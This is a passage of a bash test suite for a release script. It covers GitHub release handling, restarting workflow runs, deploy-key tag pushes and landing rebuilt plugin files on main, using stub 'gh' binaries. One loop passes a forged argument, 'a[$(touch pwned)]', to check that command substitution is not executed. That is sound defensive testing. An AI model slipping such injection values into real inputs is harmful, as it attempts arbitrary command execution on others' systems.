check "no detach between packages, pkg: every step succeeds, no push reaching origin" "$(is "$failed|$pushed" "|0")"
GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" \
  publish_package "$pj/control" packages/other other 2.0.1 other-v2.0.1
check "no detach between packages, other: tag commits its bump on top of pkg's, over the run's commit" \
  "$(is "$(git -C "$pj/control" log --format=%s -2 HEAD)|$(git -C "$pj/control" rev-parse HEAD~2)" "$other_subject"$'\n'"$pkg_subject|$run")"
check "no detach between packages, other: push-main refuses, no push reaching origin" "$(is "$failed|$pushed" "push-main|0")"
check "no detach between packages, other: the error says HEAD carries 2 commits main does not" \
  "$(contains "$out" '^::error::HEAD carries 2 commits main does not .* chore: release other v2\.0\.1 \[skip ci\]; [0-9a-f]* chore: release pkg v1\.0\.1 \[skip ci\]')"
check "no detach between packages: origin's main and tags are unchanged" "$(is "$(origin_refs)" "$refs")"

echo
echo "Case 11: release creates a missing release, publishes a draft, and reuses a published one"
# The stub gh, first on PATH. It logs each call to $GH_TEST_DIR/calls as one
# line, each argument in brackets, so an argument the script splits or joins
# shows up as a different log line. `gh release view <tag> ... --json isDraft
# -q .isDraft` answers for $GH_TEST_RELEASE: none (exit 1, as gh does for a
# missing release), draft or published (true or false), or odd (a value gh
# never prints). An upload, edit or create fails when $GH_TEST_FAIL names it.
# Any other call fails as unexpected, so a call the command should not make
# shows up as an error.
mkdir -p "$work/bin"
cat > "$work/bin/gh" <<'GH'
#!/usr/bin/env bash
{ printf '[%s]' "$@"; printf '\n'; } >> "$GH_TEST_DIR/calls"
case "$1 $2" in
  "release view")
    [[ " $* " == *" --json isDraft -q .isDraft "* ]] || { echo "view without --json isDraft: $*" >&2; exit 3; }
    case $GH_TEST_RELEASE in
      none) echo "release not found" >&2; exit 1 ;;
      draft) echo true ;;
      published) echo false ;;
      odd) echo null ;;
      *) echo "unknown GH_TEST_RELEASE $GH_TEST_RELEASE" >&2; exit 3 ;;
    esac ;;
  "release upload" | "release edit" | "release create")
    if [ "$GH_TEST_FAIL" = "$2" ]; then
      echo "HTTP 502: the test failed this $2" >&2
      exit 1
    fi ;;
  *) echo "unexpected gh call: $*" >&2; exit 3 ;;
esac
GH
chmod +x "$work/bin/gh"
# release_run <state> <fail> <args...>: runs `release-push.sh release <args...>`
# against the stub; leaves its exit code in rc, its combined output in out and
# the stub's call log in calls.
release_run() {
  local state=$1 fail=$2
  shift 2
  : > "$work/calls"
  set +e
  out=$(cd "$work" && GITHUB_REPOSITORY=example/repo GH_TEST_DIR="$work" GH_TEST_RELEASE="$state" \
    GH_TEST_FAIL="$fail" PATH="$work/bin:$PATH" "$release_push" release "$@" 2>&1)
  rc=$?
  set -e
  calls=$(<"$work/calls")
}
# argv <arg>...: one call as the stub logs it.
argv() { printf '[%s]' "$@"; }
view=$(argv release view pkg-v1.0.1 --repo example/repo --json isDraft -q .isDraft)
upload=$(argv release upload pkg-v1.0.1 a.tgz b.tgz --repo example/repo --clobber)
publish=$(argv release edit pkg-v1.0.1 --repo example/repo --draft=false)
release_run none "" pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "none: exits 0" "$(is "$rc" 0)"
check "none: creates it from the pushed tag, with generated notes" "$(is "$calls" "$view"$'\n'"$(argv release create pkg-v1.0.1 a.tgz b.tgz --repo example/repo --title "Pkg v1.0.1" --generate-notes --verify-tag)")"
check "none: the title reaches gh as one argument" "$(contains "$calls" '\[--title\]\[Pkg v1\.0\.1\]\[')"
release_run none "" --notes "Fixed notes, in a few words." pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "none, --notes: creates it with those notes" "$(is "$calls" "$view"$'\n'"$(argv release create pkg-v1.0.1 a.tgz b.tgz --repo example/repo --title "Pkg v1.0.1" --notes "Fixed notes, in a few words." --verify-tag)")"
check "none, --notes: the notes reach gh as one argument" "$(contains "$calls" '\[--notes\]\[Fixed notes, in a few words\.\]\[')"
release_run draft "" pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "draft: exits 0" "$(is "$rc" 0)"
check "draft: uploads this run's assets over its own, then publishes it" "$(is "$calls" "$view"$'\n'"$upload"$'\n'"$publish")"
check "draft: says it published the draft" "$(contains "$out" '^Published the draft release pkg-v1\.0\.1 with this run.s assets$')"
release_run published "" pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "published: exits 0" "$(is "$rc" 0)"
check "published: reuses it, touching nothing" "$(is "$calls" "$view")"
check "published: says it reused it" "$(contains "$out" '^Release pkg-v1\.0\.1 already exists; reusing it$')"
release_run published "" --upload-to-published pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "published, --upload-to-published: exits 0" "$(is "$rc" 0)"
check "published, --upload-to-published: uploads this run's assets over its own, and edits nothing" "$(is "$calls" "$view"$'\n'"$upload")"
release_run draft upload pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "draft, upload fails: exits 1" "$(is "$rc" 1)"
check "draft, upload fails: never publishes the draft" "$(is "$calls" "$view"$'\n'"$upload")"
check "draft, upload fails: says the draft is left unpublished" "$(contains "$out" "^::error::Uploading this run's assets to the draft release pkg-v1\.0\.1 failed; the draft is left unpublished\.$")"
release_run draft edit pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "draft, edit fails: exits 1" "$(is "$rc" 1)"
check "draft, edit fails: uploaded, then tried to publish" "$(is "$calls" "$view"$'\n'"$upload"$'\n'"$publish")"
check "draft, edit fails: says it is still a draft" "$(contains "$out" "^::error::Publishing the draft release pkg-v1\.0\.1 failed; it holds this run's assets and is still a draft\.$")"
release_run none create pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "none, create fails: exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "none, create fails: gh's own error is shown" "$(contains "$out" '^HTTP 502: the test failed this create$')"
release_run published upload --upload-to-published pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "published, --upload-to-published, upload fails: exits 1" "$(is "$rc" 1)"
check "published, --upload-to-published, upload fails: says so" "$(contains "$out" "^::error::Uploading this run's assets to the published release pkg-v1\.0\.1 failed\.$")"
release_run odd "" pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "a view answer that is neither true nor false: exits 1, uploading and creating nothing" "$(is "$rc|$calls" "1|$view")"
check "a view answer that is neither true nor false: the error names it" "$(contains "$out" '^::error::gh release view pkg-v1\.0\.1 printed null for isDraft, not true or false$')"
release_run none "" pkg-v1.0.1 "Pkg v1.0.1"
check "no asset: exits 2, calling no gh" "$(is "$rc|$calls" "2|")"
release_run none "" --draft pkg-v1.0.1 "Pkg v1.0.1" a.tgz
check "an unknown option: exits 2, calling no gh" "$(is "$rc|$calls" "2|")"

echo
echo "Case 11b: restart leaves the release to a later unfinished run that holds this commit, else starts one"
# The stub gh, first on PATH in a directory of its own. It logs each call to $GH_TEST_DIR/calls
# as one line, each argument in brackets. `gh run list` prints $GH_TEST_RUNS, as `gh run list
# --json databaseId,number,headSha,status` does; with $GH_TEST_LAND naming a clone, it first
# lands a merge on origin's main from that clone, as a merge landing while the runs are listed
# does, and lists that merge's queued run, number 101. `gh workflow run` prints a run URL, as gh
# 2.102.0 does (nothing when $GH_TEST_QUIET is set). Either fails when $GH_TEST_FAIL names it
# (list or run). Any other call fails as unexpected.
mkdir -p "$work/restart-bin"
cat > "$work/restart-bin/gh" <<'GH'
#!/usr/bin/env bash
{ printf '[%s]' "$@"; printf '\n'; } >> "$GH_TEST_DIR/calls"
case "$1 $2" in
  "run list")
    [ "$GH_TEST_FAIL" != list ] || { echo "HTTP 502: the test failed this list" >&2; exit 1; }
    if [ -n "$GH_TEST_LAND" ]; then
      git -C "$GH_TEST_LAND" commit -q --allow-empty -m "fix: a merge landing while the runs are listed"
      git -C "$GH_TEST_LAND" push -q origin HEAD:main
      printf '[{"databaseId":9101,"number":101,"headSha":"%s","status":"queued"}]\n' "$(git -C "$GH_TEST_LAND" rev-parse HEAD)"
    else
      printf '%s\n' "$GH_TEST_RUNS"
    fi ;;
  "workflow run")
    [ "$GH_TEST_FAIL" != run ] || { echo "HTTP 403: Resource not accessible by integration" >&2; exit 1; }
    [ -n "$GH_TEST_QUIET" ] || echo "https://github.com/example/repo/actions/runs/7" ;;
  *) echo "unexpected gh call: $*" >&2; exit 3 ;;
esac
GH
chmod +x "$work/restart-bin/gh"
# The commits: x1, the run's own checkout, and x2 on main from clone a, both pushed; then x3 on
# main from clone b, pushed after clone a last fetched, so clone a holds it only once restart's
# fetch has run. Clone a stands at x1, detached, as a publish job's checkout does.
setup "$work/rs"
ra="$work/rs/a"
rseed=$(git -C "$ra" rev-parse HEAD)
change "$ra" packages/pkg/index.js "fix: the first bug"
x1=$(git -C "$ra" rev-parse HEAD)
change "$ra" packages/pkg/index.js "fix: the second bug"
x2=$(git -C "$ra" rev-parse HEAD)
git -C "$ra" push -q origin HEAD:main
git -C "$work/rs/b" pull -q --ff-only origin main
change "$work/rs/b" packages/pkg/index.js "fix: the third bug"
x3=$(git -C "$work/rs/b" rev-parse HEAD)
git -C "$work/rs/b" push -q origin HEAD:main
git -C "$ra" checkout -q --detach "$x1"
# runs <number> <status> <commit>...: what `gh run list --json databaseId,number,headSha,status`
# prints for those runs, the run numbered N having the id 9000+N.
runs() {
  local json='' sep=''
  while [ $# -gt 0 ]; do
    json+="$sep{\"databaseId\":$((9000 + $1)),\"number\":$1,\"headSha\":\"$3\",\"status\":\"$2\"}"
    sep=,
    shift 3
  done
  printf '[%s]' "$json"
}
# restart_run <lost-races> [VAR=value]...: runs `release-push.sh restart release.yaml
# <lost-races>` from clone a as run number 100 of example/repo on main, with those settings,
# against the stub; leaves its exit code in rc, its combined output in out and the stub's call
# log in calls.
restart_run() {
  local lost=$1
  shift
  : > "$work/calls"
  set +e
  out=$(cd "$ra" && env GITHUB_REPOSITORY=example/repo GITHUB_REF_NAME=main GITHUB_RUN_NUMBER=100 \
    GITHUB_SERVER_URL=https://github.com GH_TEST_DIR="$work" GH_TEST_RUNS='[]' GH_TEST_FAIL='' \
    GH_TEST_QUIET='' GH_TEST_LAND='' PATH="$work/restart-bin:$PATH" "$@" "$release_push" restart release.yaml "$lost" 2>&1)
  rc=$?
  set -e
  calls=$(<"$work/calls")
}
list=$(argv run list --repo example/repo --workflow release.yaml --branch main --limit 50 --json databaseId,number,headSha,status)
dispatch() { argv workflow run release.yaml --repo example/repo --ref main -f "lost_races=$1"; }
by_hand='gh workflow run release\.yaml --repo example/repo --ref main'
# First, before anything has fetched x3 into clone a.
check "clone a does not hold the third fix yet" "$(git -C "$ra" cat-file -e "$x3^{commit}" 2>/dev/null && echo false || echo true)"
restart_run 0 GH_TEST_RUNS="$(runs 100 in_progress "$x1" 101 in_progress "$x3")"
check "a later unfinished run on a commit only origin holds: exits 0, starting nothing" "$(is "$rc|$calls" "0|$list")"
check "a later unfinished run on a commit only origin holds: the notice names the run and its commit" \
  "$(contains "$out" "^::notice title=No release run started::another run took this run.s version first; run https://github\.com/example/repo/actions/runs/9101, started later and not finished, is on main at $x3, which holds this commit: it releases this commit, or fails where a person sees it$")"
check "a later unfinished run on a commit only origin holds: restart fetched it" "$(git -C "$ra" cat-file -e "$x3^{commit}" 2>/dev/null && echo true || echo false)"
restart_run 0 GH_TEST_RUNS="$(runs 100 in_progress "$x1" 99 in_progress "$x2")"
check "only this run and an older one unfinished: starts a run with lost_races 1" "$(is "$rc|$calls" "0|$list"$'\n'"$(dispatch 1)")"
check "only this run and an older one unfinished: the notice names the run gh printed" \
  "$(contains "$out" '^::notice title=Release run started::another run took this run.s version first, so a new run on main, https://github\.com/example/repo/actions/runs/7, releases this commit (lost_races 1)$')"
restart_run 2
check "lost_races 2, no other run: starts a run with lost_races 3" "$(is "$rc|$calls" "0|$list"$'\n'"$(dispatch 3)")"
restart_run 3
check "lost_races 3, no other run: exits 1, starting nothing" "$(is "$rc|$calls" "1|$list")"
check "lost_races 3, no other run: the error names the command a person runs" \
  "$(contains "$out" "^::error title=No release run started::release-push\.sh restart: this run and the 3 before it each lost their version to another run; start a run by hand once releases stop landing: $by_hand$")"
for status in queued in_progress; do
  restart_run 0 GH_TEST_RUNS="$(runs 101 "$status" "$x2")"
  check "a later $status run on a descendant: exits 0, starting nothing" "$(is "$rc|$calls" "0|$list")"
done
restart_run 3 GH_TEST_RUNS="$(runs 101 queued "$x2")"
check "the same at lost_races 3: left to that run, exit 0" "$(is "$rc|$calls" "0|$list")"
restart_run 0 GH_TEST_RUNS="$(runs 102 in_progress "$x1")"
check "a later unfinished run on this very commit: exits 0, starting nothing, naming it" \
  "$(is "$rc|$calls|$(contains "$out" 'actions/runs/9102, started later')" "0|$list|true")"
restart_run 0 GH_TEST_RUNS="$(runs 101 completed "$x2" 99 in_progress "$x2")"
check "a later finished run and an older unfinished one on a descendant: starts a run" "$(is "$rc|$calls" "0|$list"$'\n'"$(dispatch 1)")"
restart_run 0 GH_TEST_RUNS="$(runs 101 in_progress "$rseed")"
check "a later unfinished run on an ancestor: starts a run" "$(is "$rc|$calls" "0|$list"$'\n'"$(dispatch 1)")"
restart_run 0 GH_TEST_RUNS="$(runs 101 in_progress 0123456789abcdef0123456789abcdef01234567)"
check "a later unfinished run on a commit neither side holds: starts a run" "$(is "$rc|$calls" "0|$list"$'\n'"$(dispatch 1)")"
restart_run 0 GH_TEST_RUNS="$(runs 101 in_progress HEAD)"
check "a later run whose commit is a ref name, not a sha: not read as git would read it, a run is started" \
  "$(is "$rc|$calls" "0|$list"$'\n'"$(dispatch 1)")"
restart_run 0 GH_TEST_QUIET=1
check "gh prints no URL: the notice says where to look" "$(contains "$out" 'so a new run on main, the newest run of release\.yaml, releases this commit (lost_races 1)$')"
restart_run 0 GH_TEST_FAIL=list
check "gh run list fails: exits non-zero, starting nothing" "$([ "$rc" != 0 ] && [ "$calls" = "$list" ] && echo true || echo false)"
restart_run 0 GH_TEST_FAIL=run
check "gh workflow run fails: exits non-zero, gh's own error shown" \
  "$(is "$([ "$rc" != 0 ] && echo failed || echo passed)|$(contains "$out" '^HTTP 403: Resource not accessible by integration$')" 'failed|true')"
# shellcheck disable=SC2016 # literal $(…), the forged count under test
for lost in 'a[$(touch pwned)]' 1e3 100 01 ''; do
  restart_run "$lost"
  printf -v shown '%q' "$lost"
  check "lost_races $shown: exits 2, calling no gh" "$(is "$rc|$calls" "2|")"
done
check "a forged lost_races: nothing in it ran" "$([ ! -e "$ra/pwned" ] && echo true || echo false)"
check "a forged lost_races: the error names it and the command a person runs" \
  "$(contains "$out" "^::error title=No release run started::release-push\.sh restart: lost_races '' is not a count from 0 to 99; start a run by hand: $by_hand$")"
for name in GITHUB_REPOSITORY GITHUB_REF_NAME GITHUB_RUN_NUMBER; do
  restart_run 0 "$name="
  check "no $name: exits 2, calling no gh" "$(is "$rc|$calls" "2|")"
done
restart_run 0 GITHUB_RUN_NUMBER=abc
check "a GITHUB_RUN_NUMBER that is not a number: exits 2, calling no gh" "$(is "$rc|$calls" "2|")"
restart_run 0 GH_TEST_LAND="$work/rs/b"
landed=$(git -C "$work/rs/b" rev-parse HEAD)
check "a merge that lands while the runs are listed: fetched after the list, so its run is waited for, not doubled" \
  "$(is "$rc|$calls|$(contains "$out" "is on main at $landed, which holds this commit")" "0|$list|true")"

echo
echo "Case: push-tag pushes a tag with the deploy key and leaves no key behind"
# The push goes to git@github.com:<repo>.git; GIT_CONFIG_* rewrites that to a local bare origin,
# so git pushes locally and the key directory is all the script under test makes. The recording
# hook sees what the directory held while the push ran.
pt="$work/pt"
mkdir -p "$pt/tmp"
git init -q --bare "$pt/origin.git"
git init -q -b main "$pt/a"
identity "$pt/a"
git -C "$pt/a" commit -q --allow-empty -m seed
git -C "$pt/a" tag pkg-v1.0.1
record_hook "$pt/origin.git"
# push_tag <tag> [VAR=value...]: deploy_run's `push-tag <tag>` in clone a.
push_tag() {
  local tag=$1
  shift
  deploy_run "$pt/a" "$@" -- push-tag "$tag"
}
push_tag pkg-v1.0.1
check "pushes: exits 0" "$(is "$rc" 0)"
check "pushes: origin holds the tag, at the clone's commit" \
  "$(is "$(git -C "$pt/origin.git" rev-parse -q --verify refs/tags/pkg-v1.0.1)" "$(git -C "$pt/a" rev-parse pkg-v1.0.1)")"
check "pushes: the key and the pinned host keys were owner-only while the push ran" \
  "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
check "pushes: nothing is left in TMPDIR" "$(is "$left" 0)"
# A tag origin lacks, so the push reaches the hook (one origin already holds is up to date).
git -C "$pt/a" tag pkg-v1.0.2
push_tag pkg-v1.0.2 PUSH_REJECT=1
check "a rejected push: exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "a rejected push: the key was written for it" "$(contains "$seen" '^600 key$')"
check "a rejected push: nothing is left in TMPDIR" "$(is "$left" 0)"
check "a rejected push: origin has no such tag" \
  "$(is "$(git -C "$pt/origin.git" tag -l pkg-v1.0.2)" "")"
push_tag pkg-v1.0.1 DEPLOY_KEY=
check "no DEPLOY_KEY: exits non-zero, with an ::error:: naming the command and the variable" \
  "$([ "$rc" != 0 ] && contains "$out" '^::error::release-push.sh push-tag: DEPLOY_KEY' || echo false)"
check "no DEPLOY_KEY: nothing is made in TMPDIR" "$(is "$left" 0)"
push_tag pkg-v1.0.1 GITHUB_REPOSITORY=
check "no GITHUB_REPOSITORY: exits non-zero, with an ::error:: naming it, making nothing in TMPDIR" \
  "$([ "$rc" != 0 ] && is "$(contains "$out" '^::error::release-push.sh push-tag: GITHUB_REPOSITORY')|$left" 'true|0' || echo false)"

echo
echo "Case: push-built lands a changed build of the Claude Envoy plugin on main, on main's tip when main moved, and refuses a doctored one"
# Each case builds a bare origin whose main holds two commits and a clone of it detached at main's
# tip, as the push job checks out the commit its build job built from. The first commit holds a
# README, the real build input list (packages/claude-envoy/scripts/build-inputs.txt, copied from
# this repository), a source file of the plugin (packages/claude-envoy/src/channel.ts) and a
# changelog the list excludes (packages/contracts/CHANGELOG.md); the second, main's built files
# under packages/claude-envoy/dist and packages/claude-envoy/legion, as an ordinary commit by a
# person, as a pull request's own committed build is. A case then moves origin's main as merges do
# while the push job waits. The tar is made as the build job makes it (`tar -cf … -C <dir> dist
# legion`), from a tree each case fills and may doctor. push-built reaches origin as push-tag does,
# through the deploy key and the GitHub URL rewritten to the local origin, and starts runs through
# the restart cases' stub gh, which logs every call. A `git` wrapper first on PATH plays a merge
# landing between push-built's fetch and its push.
pb="$work/pb"
mkdir -p "$pb/trees"
inputs_list="$script_dir/../../packages/claude-envoy/scripts/build-inputs.txt"
bot='github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>'
# plugin_tree <dir> <marker>: the files a build of the plugin holds, under <dir>/dist and
# <dir>/legion, each naming itself and <marker>.
plugin_tree() {
  local dir=$1 marker=$2 file
  for file in dist/envoy-channel.js dist/session-hook.js dist/session-title-hook.js dist/dispatch.js \
    dist/THIRD_PARTY_NOTICES legion/.claude-plugin/plugin.json legion/skills/legion-worker/SKILL.md \
    legion/agents/oracle.md legion/agents/deep-worker.md; do
    mkdir -p "$dir/$(dirname "$file")"
    printf '%s %s\n' "$file" "$marker" > "$dir/$file"
  done
}
# built_setup <dir> [--no-list]: origin.git, its seed repository and clone a under <dir> (above);
# --no-list leaves the build input list out. Main's built files carry the marker seed. Leaves
# main's first commit in first and its tip, the clone's HEAD, in base.
built_setup() {
  local dir=$1 list=${2:-}
  mkdir -p "$dir/seed/packages/claude-envoy/scripts" "$dir/seed/packages/claude-envoy/src" "$dir/seed/packages/contracts"
  git init -q -b main "$dir/seed"
  identity "$dir/seed"
  printf 'seed line\n' > "$dir/seed/README.md"
  [ "$list" = --no-list ] || cp "$inputs_list" "$dir/seed/packages/claude-envoy/scripts/build-inputs.txt"
  printf 'export const channel = 1;\n' > "$dir/seed/packages/claude-envoy/src/channel.ts"
  printf '# Changelog\n' > "$dir/seed/packages/contracts/CHANGELOG.md"
  git -C "$dir/seed" add -A
  git -C "$dir/seed" commit -q -m "seed"
  first=$(git -C "$dir/seed" rev-parse HEAD)
  plugin_tree "$dir/seed/packages/claude-envoy" seed
  git -C "$dir/seed" add -A
  git -C "$dir/seed" commit -q -m "feat(claude-envoy): the built plugin"
  base=$(git -C "$dir/seed" rev-parse HEAD)
  git clone -q --bare "$dir/seed" "$dir/origin.git"
  git clone -q "$dir/origin.git" "$dir/a"
  git -C "$dir/a" checkout -q --detach
}
# move_main <dir> <subject>: commit whatever the case changed in <dir>'s seed (nothing makes an
# empty commit) with <subject>, as a merge landing after the build started, and push it to origin's
# main; leaves it in moved.
move_main() {
  git -C "$1/seed" add -A
  git -C "$1/seed" commit -q --allow-empty -m "$2"
  git -C "$1/seed" push -q "$1/origin.git" main
  moved=$(git -C "$1/seed" rev-parse HEAD)
}
# bot_rebuild <dir> <marker> <named>: a commit on <dir>'s seed by github-actions[bot] that rewrites
# main's built files with <marker>, with push-built's subject naming <named>, pushed to origin's
# main; leaves it in rebuilt.
bot_rebuild() {
  plugin_tree "$1/seed/packages/claude-envoy" "$2"
  git -C "$1/seed" add -A
  GIT_AUTHOR_NAME='github-actions[bot]' GIT_AUTHOR_EMAIL='41898282+github-actions[bot]@users.noreply.github.com' \
    GIT_COMMITTER_NAME='github-actions[bot]' GIT_COMMITTER_EMAIL='41898282+github-actions[bot]@users.noreply.github.com' \
    git -C "$1/seed" commit -q -m "chore(claude-envoy): rebuild dist/ and legion/ from ${3:0:12} [skip ci]"
  git -C "$1/seed" push -q "$1/origin.git" main
  rebuilt=$(git -C "$1/seed" rev-parse HEAD)
}
# built_tar <name> <marker> [<mutation> [<tar argument>...]]: $pb/trees/<name>.tar, from a tree
# plugin_tree fills with <marker>, the shell text <mutation> then run in it, packed with the tar
# arguments (default: dist legion) after `-C <tree>`.
built_tar() {
  local name=$1 marker=$2 mutation=${3:-} dir="$pb/trees/$1"
  shift 2
  [ $# -eq 0 ] || shift
  [ $# -gt 0 ] || set -- dist legion
  mkdir "$dir"
  plugin_tree "$dir" "$marker"
  [ -z "$mutation" ] || (cd "$dir" && eval "$mutation")
  tar -cf "$dir.tar" -C "$dir" "$@" 2>/dev/null
}
# push_built <clone> <base> <tar> [VAR=value...]: runs `release-push.sh push-built <base> <tar>`
# from <clone>, or from $PB_SUBDIR under it when that is set, with the deploy key, a fresh TMPDIR,
# the GitHub URL rewritten to <clone>/../origin.git and the stub gh first on PATH; leaves its exit
# code in rc, its combined output in out, the stub's call log in calls and what TMPDIR holds
# afterwards in left.
PB_SUBDIR=''
push_built() {
  local clone=$1 base=$2 tar=$3 dir
  dir=$(dirname "$clone")
  shift 3
  rm -rf "$dir/tmp" && mkdir "$dir/tmp"
  : > "$dir/calls"
  set +e
  out=$(cd "$clone${PB_SUBDIR:+/$PB_SUBDIR}" && env TMPDIR="$dir/tmp" GITHUB_REPOSITORY=example/repo \
    DEPLOY_KEY="$(<"$work/deploy")" GIT_CONFIG_COUNT=1 \
    GIT_CONFIG_KEY_0="url.$dir/origin.git.insteadOf" GIT_CONFIG_VALUE_0="git@github.com:example/repo.git" \
    GH_TEST_DIR="$dir" GH_TEST_FAIL='' GH_TEST_QUIET='' GH_TEST_LAND='' PATH="$work/restart-bin:$PATH" \
    "$@" "$release_push" push-built "$base" "$tar" 2>&1)
  rc=$?
  set -e
  calls=$(<"$dir/calls")
  left=$(find "$dir/tmp" -mindepth 1 | wc -l)
}
rebuild_run=$(argv workflow run claude-envoy-rebuild.yaml --repo example/repo --ref main)
fresh_url='https://github\.com/example/repo/actions/runs/7'
# built_files <origin.git> <rev>: each file under the two directories at <rev>, its blob's hash and
# its path, sorted by path.
built_files() {
  git -C "$1" ls-tree -r "$2" -- packages/claude-envoy/dist packages/claude-envoy/legion |
    awk -F '\t' '{ split($1, f, " "); print f[3] " " $2 }' | LC_ALL=C sort -k2
}
# tree_files <tree>: the same for the files of a tar's tree under $pb/trees.
tree_files() {
  (cd "$1" && find dist legion -type f | while IFS= read -r file; do
    printf '%s packages/claude-envoy/%s\n' "$(git hash-object "$file")" "$file"
  done | LC_ALL=C sort -k2)
}
# built_landed <description> <dir> <tree> <onto> <onto-name>: origin's main under <dir> is exactly
# one commit on <onto> (named <onto-name> in the check) whose one parent is <onto>, changing only
# paths under dist/ and legion/, its two directories exactly <tree>'s files with their bytes, by
# github-actions[bot] with the subject naming $base; nothing is left in TMPDIR.
built_landed() {
  local what=$1 o="$2/origin.git" tree=$3 onto=$4 tip
  tip=$(git -C "$o" rev-parse main)
  check "$what: lands as exactly one commit whose one parent is $5" \
    "$(is "$(git -C "$o" rev-list --count "$onto..main")|$(git -C "$o" rev-list --parents -n 1 main)" "1|$tip $onto")"
  check "$what: the commit changes only paths under dist/ and legion/" \
    "$(is "$(git -C "$o" diff --name-only "$onto" main | grep -cv '^packages/claude-envoy/\(dist\|legion\)/')" 0)"
  check "$what: main's two directories hold exactly the tar's files, with its bytes" \
    "$(is "$(built_files "$o" main)" "$(tree_files "$tree")")"
  check "$what: authored and committed by github-actions[bot], the subject naming the base, with the skip keyword" \
    "$(is "$(git -C "$o" log -1 --format='%an <%ae>|%cn <%ce>|%B' main)" \
      "$bot|$bot|chore(claude-envoy): rebuild dist/ and legion/ from ${base:0:12} [skip ci]")"
  check "$what: nothing is left in TMPDIR" "$(is "$left" 0)"
}
# landing_notice <onto>: the regex of the notice push-built gives when main moved to <onto>, the
# commit it lands being origin's main ($landed_commit).
landing_notice() {
  printf '%s' "^::notice title=Landing on main's tip::built from $base, landing on $1, main's tip, as $landed_commit, which changes only packages/claude-envoy/dist and packages/claude-envoy/legion: main moved since the build started$"
}
# fresh_notice <paths>: the regex of the notice push-built gives when it started a fresh run after
# landing $landed_commit on $moved, <paths> (a regex) being the changed inputs it names.
fresh_notice() {
  printf '%s' "^::notice title=A fresh run started::the build landed on main as $landed_commit, but build inputs changed between $base and $moved: $1, so a fresh run of claude-envoy-rebuild\.yaml on main, $fresh_url, builds main's tip$"
}

built_setup "$pb/land"
built_tar land rebuilt 'rm legion/agents/deep-worker.md && mkdir legion/skills/new-skill && printf "new\n" > legion/skills/new-skill/SKILL.md'
push_built "$pb/land/a" "$base" "$pb/trees/land.tar"
check "a changed build: exits 0, calling no gh" "$(is "$rc|$calls" "0|")"
built_landed "a changed build" "$pb/land" "$pb/trees/land" "$base" "the base"
check "a changed build: a file the tar lacks is deleted" \
  "$(git -C "$pb/land/origin.git" cat-file -e main:packages/claude-envoy/legion/agents/deep-worker.md 2>/dev/null && echo false || echo true)"
check "a changed build: README.md and the plugin's source are untouched" \
  "$(is "$(git -C "$pb/land/origin.git" diff --name-only "$base" main -- README.md packages/claude-envoy/src packages/claude-envoy/scripts)" "")"
check "a changed build on an unmoved main: no Landing on main's tip notice" "$(is "$(contains "$out" 'Landing on main')" false)"

built_setup "$pb/same"
built_tar same seed
push_built "$pb/same/a" "$base" "$pb/trees/same.tar"
check "an identical build: exits 0, calling no gh" "$(is "$rc|$calls|$left" "0||0")"
check "an identical build: a notice says main already matches" "$(contains "$out" "^::notice title=Nothing to push::main.s packages/claude-envoy/dist and packages/claude-envoy/legion at $base already match this build$")"
check "an identical build: pushes nothing, leaves the clone clean" \
  "$(is "$(git -C "$pb/same/origin.git" rev-parse main)|$(git -C "$pb/same/a" rev-parse HEAD)|$(git -C "$pb/same/a" status --porcelain)" "$base|$base|")"

# Main moved by commits that change no build input: the build lands on main's tip, starting no run.
built_setup "$pb/moved"
# The hook goes in after move_main's seed push, which runs without PUSH_SEEN set and would fire it
# with nowhere to write.
move_main "$pb/moved" "fix: an empty merge landing after the build started"
record_hook "$pb/moved/origin.git"
built_tar moved rebuilt
: > "$pb/moved/seen"
push_built "$pb/moved/a" "$base" "$pb/trees/moved.tar" PUSH_SEEN="$pb/moved/seen"
landed_commit=$(git -C "$pb/moved/origin.git" rev-parse main)
check "main moved by an empty commit: exits 0, calling no gh" "$(is "$rc|$calls" "0|")"
built_landed "main moved by an empty commit" "$pb/moved" "$pb/trees/moved" "$moved" "main's moved tip"
check "main moved by an empty commit: the notice names the base, the tip and the commit" "$(contains "$out" "$(landing_notice "$moved")")"
check "main moved by an empty commit: one key directory for both fetches, and no temporary index left, while the push ran" \
  "$(is "$(<"$pb/moved/seen")" "600 key"$'\n'"600 known_hosts")"

built_setup "$pb/docs"
mkdir -p "$pb/docs/seed/docs"
printf 'notes\n' > "$pb/docs/seed/docs/notes.md"
move_main "$pb/docs" "docs: notes landing after the build started"
built_tar docs rebuilt
push_built "$pb/docs/a" "$base" "$pb/trees/docs.tar"
landed_commit=$(git -C "$pb/docs/origin.git" rev-parse main)
what="main moved by a docs-only commit, no rebuild commit on main (its build is a person's ordinary commit)"
check "$what: exits 0, calling no gh" "$(is "$rc|$calls" "0|")"
built_landed "$what" "$pb/docs" "$pb/trees/docs" "$moved" "main's moved tip"
check "$what: main keeps docs/notes.md and README.md" \
  "$(is "$(git -C "$pb/docs/origin.git" show main:docs/notes.md)|$(git -C "$pb/docs/origin.git" show main:README.md)" 'notes|seed line')"
check "$what: the notice names the base, the tip and the commit" "$(contains "$out" "$(landing_notice "$moved")")"
check "$what: no fresh run notice" "$(is "$(contains "$out" 'A fresh run started')" false)"

built_setup "$pb/excluded"
printf -- '- a note\n' >> "$pb/excluded/seed/packages/contracts/CHANGELOG.md"
move_main "$pb/excluded" "docs(contracts): a changelog line"
built_tar excluded rebuilt
push_built "$pb/excluded/a" "$base" "$pb/trees/excluded.tar"
landed_commit=$(git -C "$pb/excluded/origin.git" rev-parse main)
what="main moved by a commit to packages/contracts/CHANGELOG.md, which the list excludes inside an input directory"
check "$what: exits 0, calling no gh" "$(is "$rc|$calls" "0|")"
